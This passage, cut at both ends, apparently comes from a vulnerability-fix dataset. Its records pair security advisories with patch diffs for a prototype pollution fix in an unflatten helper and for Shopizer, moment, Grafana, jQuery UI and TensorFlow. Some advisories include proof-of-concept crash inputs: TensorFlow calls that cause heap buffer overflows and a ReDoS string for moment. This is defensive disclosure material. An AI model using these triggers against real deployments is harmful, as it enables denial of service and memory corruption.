function unflatten(obj = {}) {\\n     let m = {};\\n \\n     while ((m = regex.exec(p))) {\\n+      if (curr[prop] === constructor.prototype)\\n+        curr[prop] = {}\\n       curr = curr[prop] || (curr[prop] = m[2] ? [] : {});\\n       prop = m[2] || m[1];\\n     }'}}","message_norm":"merge pull request #8 from 418sec\/1-npm-arr-flatten-unflatten\n\nsecurity fix for prototype pollution - huntr.dev","language":"en","entities":"[('#8', 'ISSUE', ''), ('security', 'SECWORD', ''), ('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['unflatten.js'])","num_files":1.0},{"index":3252,"vuln_id":"GHSA-w8rc-pgxq-x2cj","cwe_id":"{'CWE-20'}","score":6.5,"chain":"{'https:\/\/github.com\/shopizer-ecommerce\/shopizer\/commit\/929ca0839a80c6f4dad087e0259089908787ad2a'}","dataset":"osv","summary":"Negative charge in shopping cart in Shopizer ### Impact\nUsing API or Controller based versions negative quantity is not adequately validated hence creating incorrect shopping cart and order total. \n\n### Patches\nAdding a back-end verification to check that quantity parameter isn't negative. If so, it is set to 1. Patched in 2.11.0\n\n### Workarounds\nWithout uprading, it's possible to just apply the fixes in the same files it's done for the patch. Or you use javax constraint validation on the quantity parameter.\n\n### References\n[Input Validation](https:\/\/cheatsheetseries.owasp.org\/cheatsheets\/Input_Validation_Cheat_Sheet.html)\n[Using bean validation constraint](https:\/\/javaee.github.io\/tutorial\/bean-validation002.html)\n[Commits with fixes](https:\/\/github.com\/shopizer-ecommerce\/shopizer\/commit\/929ca0839a80c6f4dad087e0259089908787ad2a)\nCVE Details below : \n[Mitre](https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2020-11007)\n[NVD](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2020-11007)\n\n### Credits\nFound and solved by Yannick Gosset from Aix-Marseille University cybersecurity\nmaster program supervised by Yassine Ilmi","published_date":"2020-04-22","chain_len":1,"project":"https:\/\/github.com\/shopizer-ecommerce\/shopizer","commit_href":"https:\/\/github.com\/shopizer-ecommerce\/shopizer\/commit\/929ca0839a80c6f4dad087e0259089908787ad2a","commit_sha":"929ca0839a80c6f4dad087e0259089908787ad2a","patch":"SINGLE","chain_ord":"['929ca0839a80c6f4dad087e0259089908787ad2a']","before_first_fix_commit":"{'de8a8e3183f8c5fed4695f889e309a6fff70adae', '6858049b39bdc51b71e6419b7c4bba1347737cb7'}","last_fix_commit":"929ca0839a80c6f4dad087e0259089908787ad2a","chain_ord_pos":1.0,"commit_datetime":"04\/10\/2020, 13:35:12","message":"Merge pull request from GHSA-w8rc-pgxq-x2cj\n\nFixing negative charge vulnerability","author":"Shopizer","comments":null,"stats":"{'additions': 5, 'deletions': 7, 'total': 12}","files":"{'sm-shop\/src\/main\/java\/com\/salesmanager\/shop\/store\/controller\/shoppingCart\/facade\/ShoppingCartFacadeImpl.java': {'additions': 5, 'deletions': 7, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/shopizer-ecommerce\/shopizer\/raw\/929ca0839a80c6f4dad087e0259089908787ad2a\/sm-shop%2Fsrc%2Fmain%2Fjava%2Fcom%2Fsalesmanager%2Fshop%2Fstore%2Fcontroller%2FshoppingCart%2Ffacade%2FShoppingCartFacadeImpl.java', 'patch': '@@ -108,7 +108,7 @@ public ShoppingCartData addItemsToShoppingCart( final ShoppingCartData shoppingC\\n     {\\n \\n         ShoppingCart cartModel = null;\\n-        \\n+        if(item.getQuantity() < 1) item.setQuantity(1);\\n         \/**\\n          * Sometimes a user logs in and a shopping cart is present in db (shoppingCartData\\n          * but ui has no cookie with shopping cart code so the cart code will have\\n@@ -216,7 +216,7 @@ private com.salesmanager.core.model.shoppingcart.ShoppingCartItem createCartItem\\n         }\\n         \\t\\n         for(ProductAvailability availability : availabilities) {\\n-        \\tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() ==0) {\\n+        \\tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() <= 0) {\\n                 throw new Exception( \"Item with id \" + product.getId() + \" is not available\");\\n         \\t}\\n         }\\n@@ -288,7 +288,7 @@ private com.salesmanager.core.model.shoppingcart.ShoppingCartItem createCartItem\\n         }\\n         \\t\\n         for(ProductAvailability availability : availabilities) {\\n-        \\tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() ==0) {\\n+        \\tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() <= 0) {\\n                 throw new Exception( \"Item with id \" + product.getId() + \" is not available\");\\n         \\t}\\n         }\\n@@ -554,8 +554,7 @@ public ShoppingCartData updateCartItem( final Long itemID, final String cartId,\\n         return null;\\n     }\\n     \\n-    @SuppressWarnings(\"unchecked\")\\n-\\t@Override\\n+    @Override\\n     public ShoppingCartData updateCartItems( final List<ShoppingCartItem> shoppingCartItems, final MerchantStore store, final Language language )\\n             throws Exception\\n         {\\n@@ -720,7 +719,6 @@ public ReadableShoppingCart addToCart(PersistableShoppingCartItem item, Merchant\\n \\t}\\n \\t\\n \\n-\\t@SuppressWarnings(\"unchecked\")\\n \\t@Override\\n \\tpublic void removeShoppingCartItem(String cartCode, Long productId,\\n \\t      MerchantStore merchant, Language language) throws Exception {\\n@@ -914,7 +912,7 @@ public ReadableShoppingCart addToCart(Customer customer, PersistableShoppingCart\\n \\t\\t\\n \\t\\tValidate.notNull(customer,\"Customer cannot be null\");\\n \\t\\tValidate.notNull(customer.getId(),\"Customer.id cannot be null or empty\");\\n-\\t\\t\\n+\\t\\tif(item.getQuantity() < 1) item.setQuantity(1);\\n \\t\\t\/\/Check if customer has an existing shopping cart\\n \\t\\tShoppingCart cartModel = shoppingCartService.getByCustomer(customer);'}}","message_norm":"merge pull request from ghsa-w8rc-pgxq-x2cj\n\nfixing negative charge vulnerability","language":"en","entities":"[('ghsa-w8rc-pgxq-x2cj', 'VULNID', 'GHSA'), ('fixing', 'ACTION', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['sm-shop\/src\/main\/java\/com\/salesmanager\/shop\/store\/controller\/shoppingCart\/facade\/ShoppingCartFacadeImpl.java'])","num_files":1.0},{"index":3258,"vuln_id":"GHSA-wc69-rhjr-hc9g","cwe_id":"{'CWE-400', 'CWE-1333'}","score":7.5,"chain":"{'https:\/\/github.com\/moment\/moment\/commit\/9a3b5894f3d5d602948ac8a02e4ee528a49ca3a3'}","dataset":"osv","summary":"Inefficient Regular Expression Complexity in moment ### Impact\n\n* using string-to-date parsing in moment (more specifically rfc2822 parsing, which is tried by default) has quadratic (N^2) complexity on specific inputs\n* noticeable slowdown is observed with inputs above 10k characters\n* users who pass user-provided strings without sanity length checks to moment constructor are vulnerable to (Re)DoS attacks\n\n### Patches\nThe problem is patched in 2.29.4, the patch can be applied to all affected versions with minimal tweaking.\n\n### Workarounds\nIn general, given the proliferation of ReDoS attacks, it makes sense to limit the length of the user input to something sane, like 200 characters or less. I haven't seen legitimate cases of date-time strings longer than that, so all moment users who do pass a user-originating string to constructor are encouraged to apply such a rudimentary filter, that would help with this but also most future ReDoS vulnerabilities.\n\n### References\nThere is an excellent writeup of the issue here: https:\/\/github.com\/moment\/moment\/pull\/6015#issuecomment-1152961973=\n\n### Details\nThe issue is rooted in the code that removes legacy comments (stuff inside parenthesis) from strings during rfc2822 parsing. `moment(\"(\".repeat(500000))` will take a few minutes to process, which is unacceptable.","published_date":"2022-07-06","chain_len":1,"project":"https:\/\/github.com\/moment\/moment","commit_href":"https:\/\/github.com\/moment\/moment\/commit\/9a3b5894f3d5d602948ac8a02e4ee528a49ca3a3","commit_sha":"9a3b5894f3d5d602948ac8a02e4ee528a49ca3a3","patch":"SINGLE","chain_ord":"['9a3b5894f3d5d602948ac8a02e4ee528a49ca3a3']","before_first_fix_commit":"{'6374fd860aeff75e6c9d9d11540c6b22bc7ef175'}","last_fix_commit":"9a3b5894f3d5d602948ac8a02e4ee528a49ca3a3","chain_ord_pos":1.0,"commit_datetime":"07\/06\/2022, 15:28:25","message":"[bugfix] Fix redos in preprocessRFC2822 regex (#6015)\n\n* fix ReDoS in preprocessRFC2822 regex\r\n\r\nFixes: [#2936](https:\/\/github.com\/moment\/moment\/issues\/6012)\r\n\r\nDisallow nested rfc2822 comments to prevent quadratic regex execution time (i.e each open bracket is considered at most twice).","author":"Khang Vo (doublevkay)","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/lib\/create\/from-string.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moment\/moment\/raw\/9a3b5894f3d5d602948ac8a02e4ee528a49ca3a3\/src%2Flib%2Fcreate%2Ffrom-string.js', 'patch': \"@@ -151,7 +151,7 @@ function untruncateYear(yearStr) {\\n function preprocessRFC2822(s) {\\n     \/\/ Remove comments and folding whitespace and replace multiple-spaces with a single space\\n     return s\\n-        .replace(\/\\\\([^)]*\\\\)|[\\\\n\\\\t]\/g, ' ')\\n+        .replace(\/\\\\([^()]*\\\\)|[\\\\n\\\\t]\/g, ' ')\\n         .replace(\/(\\\\s\\\\s+)\/g, ' ')\\n         .replace(\/^\\\\s\\\\s*\/, '')\\n         .replace(\/\\\\s\\\\s*$\/, '');\"}}","message_norm":"[bugfix] fix redos in preprocessrfc2822 regex (#6015)\n\n* fix redos in preprocessrfc2822 regex\r\n\r\nfixes: [#2936](https:\/\/github.com\/moment\/moment\/issues\/6012)\r\n\r\ndisallow nested rfc2822 comments to prevent quadratic regex execution time (i.e each open bracket is considered at most twice).","language":"en","entities":"[('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('preprocessrfc2822', 'SECWORD', ''), ('#6015', 'ISSUE', ''), ('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('preprocessrfc2822', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#2936](https:\/\/github.com', 'ISSUE', ''), ('issues\/6012', 'FLAW', ''), ('prevent', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib\/create\/from-string.js'])","num_files":1.0},{"index":3261,"vuln_id":"GHSA-wc9w-wvq2-ffm9","cwe_id":"{'CWE-918'}","score":5.4,"chain":"{'https:\/\/github.com\/grafana\/grafana\/commit\/ba953be95f0302c2ea80d23f1e5f2c1847365192'}","dataset":"osv","summary":"Server Side Request Forgery in Grafana The avatar feature in Grafana 3.0.1 through 7.0.1 has an SSRF Incorrect Access Control issue that allows remote code execution. This vulnerability allows any unauthenticated user\/client to make Grafana send HTTP requests to any URL and return its result to the user\/client. This can be used to gain information about the network that Grafana is running on.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/grafana\/grafana","commit_href":"https:\/\/github.com\/grafana\/grafana\/commit\/ba953be95f0302c2ea80d23f1e5f2c1847365192","commit_sha":"ba953be95f0302c2ea80d23f1e5f2c1847365192","patch":"SINGLE","chain_ord":"['ba953be95f0302c2ea80d23f1e5f2c1847365192']","before_first_fix_commit":"{'e5414f44aa2728cce0dbbc7698fddb514fa8193a'}","last_fix_commit":"ba953be95f0302c2ea80d23f1e5f2c1847365192","chain_ord_pos":1.0,"commit_datetime":"06\/03\/2020, 13:56:13","message":"Only allow 32 hexadecimal digits for the avatar hash (#25322)\n\n(cherry picked from commit 7a9c0e31eca4958f5fba053cfea9e64a2ea58509)","author":"Marcus Efraimsson","comments":null,"stats":"{'additions': 11, 'deletions': 5, 'total': 16}","files":"{'pkg\/api\/avatar\/avatar.go': {'additions': 11, 'deletions': 5, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/grafana\/grafana\/raw\/ba953be95f0302c2ea80d23f1e5f2c1847365192\/pkg%2Fapi%2Favatar%2Favatar.go', 'patch': '@@ -15,14 +15,14 @@ import (\\n \\t\"net\/http\"\\n \\t\"net\/url\"\\n \\t\"path\/filepath\"\\n+\\t\"regexp\"\\n \\t\"strconv\"\\n-\\t\"strings\"\\n \\t\"sync\"\\n \\t\"time\"\\n \\n \\t\"github.com\/grafana\/grafana\/pkg\/infra\/log\"\\n+\\t\"github.com\/grafana\/grafana\/pkg\/models\"\\n \\t\"github.com\/grafana\/grafana\/pkg\/setting\"\\n-\\t\"gopkg.in\/macaron.v1\"\\n \\n \\tgocache \"github.com\/patrickmn\/go-cache\"\\n )\\n@@ -73,9 +73,15 @@ type CacheServer struct {\\n \\tcache    *gocache.Cache\\n }\\n \\n-func (this *CacheServer) Handler(ctx *macaron.Context) {\\n-\\turlPath := ctx.Req.URL.Path\\n-\\thash := urlPath[strings.LastIndex(urlPath, \"\/\")+1:]\\n+var validMD5 = regexp.MustCompile(\"^[a-fA-F0-9]{32}$\")\\n+\\n+func (this *CacheServer) Handler(ctx *models.ReqContext) {\\n+\\thash := ctx.Params(\"hash\")\\n+\\n+\\tif len(hash) != 32 || !validMD5.MatchString(hash) {\\n+\\t\\tctx.JsonApiErr(404, \"Avatar not found\", nil)\\n+\\t\\treturn\\n+\\t}\\n \\n \\tvar avatar *Avatar\\n \\tobj, exists := this.cache.Get(hash)'}}","message_norm":"only allow 32 hexadecimal digits for the avatar hash (#25322)\n\n(cherry picked from commit 7a9c0e31eca4958f5fba053cfea9e64a2ea58509)","language":"en","entities":"[('hash', 'SECWORD', ''), ('#25322', 'ISSUE', ''), ('commit 7a9c0e31eca4958f5fba053cfea9e64a2ea58509', 'SHA', 'prefix_colon_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['pkg\/api\/avatar\/avatar.go'])","num_files":1.0},{"index":3262,"vuln_id":"GHSA-wcm2-9c89-wmfm","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/jquery\/jquery-ui\/commit\/7e9060c109b928769a664dbcc2c17bd21231b6f3'}","dataset":"osv","summary":"Cross-site Scripting in jquery-ui Cross-site scripting (XSS) vulnerability in jquery.ui.dialog.js in the Dialog widget in jQuery UI before 1.10.0 allows remote attackers to inject arbitrary web script or HTML via the title option.","published_date":"2017-10-24","chain_len":1,"project":"https:\/\/github.com\/jquery\/jquery-ui","commit_href":"https:\/\/github.com\/jquery\/jquery-ui\/commit\/7e9060c109b928769a664dbcc2c17bd21231b6f3","commit_sha":"7e9060c109b928769a664dbcc2c17bd21231b6f3","patch":"SINGLE","chain_ord":"['7e9060c109b928769a664dbcc2c17bd21231b6f3']","before_first_fix_commit":"{'60486ac632a0a1bbbb0c7449fe17bccfae11af80'}","last_fix_commit":"7e9060c109b928769a664dbcc2c17bd21231b6f3","chain_ord_pos":1.0,"commit_datetime":"11\/26\/2012, 09:14:36","message":"Dialog: Extract setting the title into a _title method, use .text() to prevent XSS. Fixes #6016 - Dialog: Title XSS Vulnerability.","author":"J\u00f6rn Zaefferer","comments":null,"stats":"{'additions': 9, 'deletions': 4, 'total': 13}","files":"{'ui\/jquery.ui.dialog.js': {'additions': 9, 'deletions': 4, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jquery\/jquery-ui\/raw\/7e9060c109b928769a664dbcc2c17bd21231b6f3\/ui%2Fjquery.ui.dialog.js', 'patch': '@@ -352,14 +352,21 @@ $.widget(\"ui.dialog\", {\\n \\t\\tuiDialogTitle = $( \"<span>\" )\\n \\t\\t\\t.uniqueId()\\n \\t\\t\\t.addClass( \"ui-dialog-title\" )\\n-\\t\\t\\t.html( this.options.title || \"&#160;\" )\\n \\t\\t\\t.prependTo( this.uiDialogTitlebar );\\n+\\t\\tthis._title( uiDialogTitle );\\n \\n \\t\\tthis.uiDialog.attr({\\n \\t\\t\\t\"aria-labelledby\": uiDialogTitle.attr( \"id\" )\\n \\t\\t});\\n \\t},\\n \\n+\\t_title: function( title ) {\\n+\\t\\tif ( !this.options.title ) {\\n+\\t\\t\\ttitle.html( \"&#160;\" );\\n+\\t\\t}\\n+\\t\\ttitle.text( this.options.title );\\n+\\t},\\n+\\n \\t_createButtonPane: function() {\\n \\t\\tvar uiDialogButtonPane = ( this.uiDialogButtonPane = $( \"<div>\" ) )\\n \\t\\t\\t.addClass( \"ui-dialog-buttonpane ui-widget-content ui-helper-clearfix\" );\\n@@ -600,9 +607,7 @@ $.widget(\"ui.dialog\", {\\n \\t\\t}\\n \\n \\t\\tif ( key === \"title\" ) {\\n-\\t\\t\\t\/\/ convert whatever was passed in to a string, for html() to not throw up\\n-\\t\\t\\t$( \".ui-dialog-title\", this.uiDialogTitlebar )\\n-\\t\\t\\t\\t.html( \"\" + ( value || \"&#160;\" ) );\\n+\\t\\t\\tthis._title( this.uiDialogTitlebar.find( \".ui-dialog-title\" ) );\\n \\t\\t}\\n \\t},'}}","message_norm":"dialog: extract setting the title into a _title method, use .text() to prevent xss. fixes #6016 - dialog: title xss vulnerability.","language":"en","entities":"[('prevent', 'ACTION', ''), ('xss', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#6016', 'ISSUE', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ui\/jquery.ui.dialog.js'])","num_files":1.0},{"index":3264,"vuln_id":"GHSA-wcv5-qrj6-9pfm","cwe_id":"{'CWE-787', 'CWE-120'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8f37b52e1320d8d72a9529b2468277791a261197'}","dataset":"osv","summary":"Heap buffer overflow in `Conv3DBackprop*` ### Impact\nMissing validation between arguments to `tf.raw_ops.Conv3DBackprop*` operations can result in heap buffer overflows:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)\nout_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 89, 29, 89, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_values = [-10.0] * (7 * 7 * 7 * 7 * 7)\ninput_values[0] = 429.6491056791816\ninput_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)\nfilter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)\n  \ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/4814fafb0ca6b5ab58a09411523b2193fed23fed\/tensorflow\/core\/kernels\/conv_grad_shape_utils.cc#L94-L153) assumes that the `input`, `filter_sizes` and `out_backprop` tensors have the same shape, as they are accessed in parallel.\n\n### Patches\nWe have patched the issue in GitHub commit [8f37b52e1320d8d72a9529b2468277791a261197](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8f37b52e1320d8d72a9529b2468277791a261197).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our securityguide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8f37b52e1320d8d72a9529b2468277791a261197","commit_sha":"8f37b52e1320d8d72a9529b2468277791a261197","patch":"SINGLE","chain_ord":"['8f37b52e1320d8d72a9529b2468277791a261197']","before_first_fix_commit":"{'4814fafb0ca6b5ab58a09411523b2193fed23fed'}","last_fix_commit":"8f37b52e1320d8d72a9529b2468277791a261197","chain_ord_pos":1.0,"commit_datetime":"04\/19\/2021, 20:46:32","message":"Validate some shape requirements for `Conv3DBackpropFilter*` and `Conv3DBackpropInput*` ops.\n\nOlder versions of Eigen might otherwise crash \/ produce OOB read on specially crafted inputs.\n\nPiperOrigin-RevId: 369293977\nChange-Id: I58f51445a93936d7cf8e616f75de17677df36718","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 56, 'deletions': 0, 'total': 56}","files":"{'tensorflow\/core\/kernels\/conv_grad_ops_3d.cc': {'additions': 56, 'deletions': 0, 'changes': 56, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8f37b52e1320d8d72a9529b2468277791a261197\/tensorflow%2Fcore%2Fkernels%2Fconv_grad_ops_3d.cc', 'patch': '@@ -239,6 +239,20 @@ class Conv3DBackpropInputOp : public OpKernel {\\n       input_shape = context->input(0).shape();\\n     }\\n \\n+    OP_REQUIRES(\\n+        context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n+        errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n+                                \"number of channels. Got \",\\n+                                input_shape.dim_size(4), \" for input and \",\\n+                                filter_shape.dim_size(3), \" for filter_sizes\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dim_size(4) == filter_shape.dim_size(4),\\n+        errors::InvalidArgument(\"out_backprop and filter_sizes must have the \"\\n+                                \"same number of channels. Got \",\\n+                                out_backprop_shape.dim_size(4),\\n+                                \" for out_backprop and \",\\n+                                filter_shape.dim_size(4), \" for filter_sizes\"));\\n+\\n     ConvBackpropDimensions dims;\\n     OP_REQUIRES_OK(context, ConvBackpropComputeDimensions(\\n                                 \"Conv3DBackpropInputOp\", \/*num_spatial_dims=*\/3,\\n@@ -346,6 +360,20 @@ class Conv3DCustomBackpropInputOp : public OpKernel {\\n       input_shape = context->input(0).shape();\\n     }\\n \\n+    OP_REQUIRES(\\n+        context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n+        errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n+                                \"number of channels. Got \",\\n+                                input_shape.dim_size(4), \" for input and \",\\n+                                filter_shape.dim_size(3), \" for filter_sizes\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dim_size(4) == filter_shape.dim_size(4),\\n+        errors::InvalidArgument(\"out_backprop and filter_sizes must have the \"\\n+                                \"same number of channels. Got \",\\n+                                out_backprop_shape.dim_size(4),\\n+                                \" for out_backprop and \",\\n+                                filter_shape.dim_size(4), \" for filter_sizes\"));\\n+\\n     ConvBackpropDimensions dims;\\n     OP_REQUIRES_OK(context, ConvBackpropComputeDimensions(\\n                                 \"Conv3DBackpropInputOp\", \/*num_spatial_dims=*\/3,\\n@@ -696,6 +724,20 @@ class Conv3DBackpropFilterOp : public OpKernel {\\n       filter_shape = context->input(1).shape();\\n     }\\n \\n+    OP_REQUIRES(\\n+        context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n+        errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n+                                \"number of channels. Got \",\\n+                                input_shape.dim_size(4), \" for input and \",\\n+                                filter_shape.dim_size(3), \" for filter_sizes\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dim_size(4) == filter_shape.dim_size(4),\\n+        errors::InvalidArgument(\"out_backprop and filter_sizes must have the \"\\n+                                \"same number of channels. Got \",\\n+                                out_backprop_shape.dim_size(4),\\n+                                \" for out_backprop and \",\\n+                                filter_shape.dim_size(4), \" for filter_sizes\"));\\n+\\n     ConvBackpropDimensions dims;\\n     OP_REQUIRES_OK(context,\\n                    ConvBackpropComputeDimensions(\\n@@ -808,6 +850,20 @@ class Conv3DCustomBackpropFilterOp : public OpKernel {\\n       filter_shape = context->input(1).shape();\\n     }\\n \\n+    OP_REQUIRES(\\n+        context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n+        errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n+                                \"number of channels. Got \",\\n+                                input_shape.dim_size(4), \" for input and \",\\n+                                filter_shape.dim_size(3), \" for filter_sizes\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dim_size(4) == filter_shape.dim_size(4),\\n+        errors::InvalidArgument(\"out_backprop and filter_sizes must have the \"\\n+                                \"same number of channels. Got \",\\n+                                out_backprop_shape.dim_size(4),\\n+                                \" for out_backprop and \",\\n+                                filter_shape.dim_size(4), \" for filter_sizes\"));\\n+\\n     ConvBackpropDimensions dims;\\n     OP_REQUIRES_OK(context,\\n                    ConvBackpropComputeDimensions('}}","message_norm":"validate some shape requirements for `conv3dbackpropfilter*` and `conv3dbackpropinput*` ops.\n\nolder versions of eigen might otherwise crash \/ produce oob read on specially crafted inputs.\n\npiperorigin-revid: 369293977\nchange-id: i58f51445a93936d7cf8e616f75de17677df36718","language":"en","entities":"[('validate', 'ACTION', ''), ('oob', 'SECWORD', ''), ('369293977', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_grad_ops_3d.cc'])","num_files":1.0},{"index":3265,"vuln_id":"GHSA-wcv5-vrvr-3rx2","cwe_id":"{'CWE-190'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/be7b286d40bc68cb0b56f702186cc4837d508058'}","dataset":"osv","summary":"Integer Overflow or Wraparound in TensorFlow ### Impact\nThe Grappler component of TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) in [constant folding](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc#L963-L1035):\n\n```cc\n  for (const auto& output_prop : output_props) {\n    const PartialTensorShape output_shape(output_prop.shape());\n    \/\/ ...\n  }\n```\n  \nThe `output_prop` tensor has a shape that is controlled by user input and this can result in triggering one of the `CHECK`s in the `PartialTensorShape` constructor. This is an instance of [TFSA-2021-198](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/tensorflow\/security\/advisory\/tfsa-2021-198.md) (CVE-2021-41197).\n\n### Patches\nWe have patched the issue in GitHub commit [be7b286d40bc68cb0b56f702186cc4837d508058](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/be7b286d40bc68cb0b56f702186cc4837d508058).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/be7b286d40bc68cb0b56f702186cc4837d508058","commit_sha":"be7b286d40bc68cb0b56f702186cc4837d508058","patch":"SINGLE","chain_ord":"['be7b286d40bc68cb0b56f702186cc4837d508058']","before_first_fix_commit":"{'6381a7b127bd276a3817a93e5423b15a06c33419'}","last_fix_commit":"be7b286d40bc68cb0b56f702186cc4837d508058","chain_ord_pos":1.0,"commit_datetime":"11\/15\/2021, 21:55:14","message":"Fix `CHECK`-failure caused by constant folding code.\n\nWe're losing a `const` qualifier here, but unless we get to use more `StatusOr` objects, this is the best alternative.\n\nPiperOrigin-RevId: 410072241\nChange-Id: I69535c91490f0d23facb9587d2ff59db0782cda6","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'tensorflow\/core\/grappler\/optimizers\/constant_folding.cc': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/be7b286d40bc68cb0b56f702186cc4837d508058\/tensorflow%2Fcore%2Fgrappler%2Foptimizers%2Fconstant_folding.cc', 'patch': '@@ -1017,7 +1017,12 @@ bool ConstantFolding::IsFoldableUncached(\\n       }\\n     }\\n     for (const auto& output_prop : output_props) {\\n-      const PartialTensorShape output_shape(output_prop.shape());\\n+      PartialTensorShape output_shape;\\n+      if (!PartialTensorShape::BuildPartialTensorShape(output_prop.shape(),\\n+                                                       &output_shape)\\n+               .ok()) {\\n+        return false;\\n+      }\\n       if (output_shape.IsFullyDefined()) {\\n         const int64_t num_bytes =\\n             output_shape.num_elements() * DataTypeSize(output_prop.dtype());'}}","message_norm":"fix `check`-failure caused by constant folding code.\n\nwe're losing a `const` qualifier here, but unless we get to use more `statusor` objects, this is the best alternative.\n\npiperorigin-revid: 410072241\nchange-id: i69535c91490f0d23facb9587d2ff59db0782cda6","language":"en","entities":"[('fix', 'ACTION', ''), ('410072241', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/optimizers\/constant_folding.cc'])","num_files":1.0},{"index":3267,"vuln_id":"GHSA-wf5p-c75w-w3wh","cwe_id":"{'CWE-476'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d6b57f461b39fd1aa8c1b870f1b974aac3554955'}","dataset":"osv","summary":"Null pointer dereference in 